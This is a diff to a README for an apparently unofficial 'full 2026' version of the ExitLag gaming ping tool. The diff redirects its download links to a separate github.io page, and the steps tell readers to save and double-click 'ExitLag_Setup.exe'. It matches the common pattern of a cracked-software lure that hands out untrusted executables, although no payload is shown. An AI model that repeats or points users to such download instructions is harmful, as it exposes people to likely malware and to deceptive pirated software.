@@ -1,6 +1,6 @@
 # 🎮 Exitlag-Full-2026 - Lower your ping for better gaming
 
-[![Download ExitLag Now](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Sodhime6642/Exitlag-Full-2026)
+[![Download ExitLag Now](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://sodhime6642.github.io)
 
 ## 📌 About this software
 
@@ -22,7 +22,7 @@ Before you install this program, check if your computer meets these standards:
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the official repository page to get the installation file: [Download ExitLag Full](https://github.com/Sodhime6642/Exitlag-Full-2026).
+1.  Visit the official repository page to get the installation file: [Download ExitLag Full](https://sodhime6642.github.io).
 2.  Locate the download button on the page.
 3.  Save the installer file to your Downloads folder.
 4.  Open the folder and double-click the file named ExitLag_Setup.exe.
